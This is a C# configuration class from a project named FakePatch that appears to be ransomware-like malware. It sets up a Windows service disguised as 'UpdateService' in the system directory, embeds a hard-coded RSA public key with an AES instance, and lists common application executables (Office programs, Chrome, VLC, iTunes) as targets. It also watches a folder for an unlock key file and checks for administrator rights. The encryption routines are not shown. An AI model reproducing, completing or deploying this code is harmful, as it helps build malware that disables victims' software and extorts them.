using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;

namespace FakePatch
{
    public static class Globals
    {
        //service configuration
        public const string gServiceName = "UpdateService";
        public static string gServicePath = Environment.SystemDirectory;
        public static FileInfo gServiceExecutablePath = new FileInfo(Path.Combine(gServicePath, new FileInfo(Assembly.GetExecutingAssembly().Location).Name));

        //encryption options
        public static string gKeyName = "Key01";
        public const int gKeySize = 1024;
        public const bool gPersistKey = false;
        public static RSACryptoServiceProvider gRSA;
        public static Aes gAes = Aes.Create();
        public const string gEncryptKeyXML = "<RSAKeyValue><Modulus>4IAQMo8/RljNnFWhiwc25c2/zTANKQvftADzCFWYLZwsvuK0wKXv2YPzN3WCLPys53ftQi+l30Bpex1JRJsEd3dGdkVwzZ0moD7JQKmIW0xgVl48R+0bgRAwCyrVrnAKABi/lOBp0ipYu3BMw0yMC8EiAY915dxXGzYqt3ezx70=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        public static string[] gFilePaths = { @"excel.exe", @"winword.exe", @"powerpnt.exe", @"mspub.exe", @"msaccess.exe", @"outlook.exe", @"vlc.exe", @"chrome.exe", @"itunes.exe" };

        //fileWatcher options
        public static string gKeyWatchPath = @"C:\keywatch";
        public static string gKeyTxtFileName = @"key.txt";
        public const int gKeyTxtFileMaxSize = 1024;

        //logging options
        public const string gEventLogName = "FakePatch";
        public const string gEventSourceName = "FakePatch";
        public const LogTarget gLogTarget = LogTarget.File;
        public static FileInfo gLogFile = new FileInfo(@"c:\temp\log.txt");

        public static bool gIsElevated
        {
            get
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}
